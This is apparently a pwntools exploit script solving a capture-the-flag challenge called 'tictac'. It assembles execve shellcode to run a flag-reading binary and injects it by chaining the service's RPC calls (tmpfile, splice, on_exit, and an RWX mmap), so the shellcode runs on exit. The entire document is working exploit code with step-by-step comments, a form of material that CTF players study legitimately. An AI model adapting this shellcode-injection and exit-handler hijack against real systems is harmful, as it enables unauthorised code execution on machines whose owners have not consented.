from pwn import *
context.update(arch="amd64", os="linux")
context.log_level = 'info'

if args.REMOTE:
  p = remote('tictac.nc.jctf.pro', 1337)
else:
  p = remote('127.0.0.1', 1337)

payload = asm('''
loop:
   mov eax,59
   lea rdi, text[rip]
   xor esi,esi
   xor edx,edx
   syscall
text:
   .ascii "/jailed/readflag"
''')


# we create a temporary file (filedescriptor will be 3)
p.sendlineafter('ready\n', 'tictactoe:tmpfile 0 0 0 0 0 0')
#  read data from fd 0 (stdin) to fd 3 (our temp file)
p.sendlineafter('RPC\n', 'tictactoe:splice 0 0 3 0 '+str(len(payload))+' 0')
# send data to be written in our temp file
p.send(payload)
# set execute shellcode at 0x10000 on exit
p.sendlineafter('RPC\n', 'tictactoe:on_exit 65536 1 0 0 0 0')
# mmap our temporary file to 0x10000 as rwx, that will exit after the mapping is executed as security_check will detect it
# and while exiting, it will execute our shellcode registered with on_exit(addr) function
p.sendlineafter('RPC\n', 'tictactoe:mmap 65536 4096 7 17 3 0')
p.interactive()
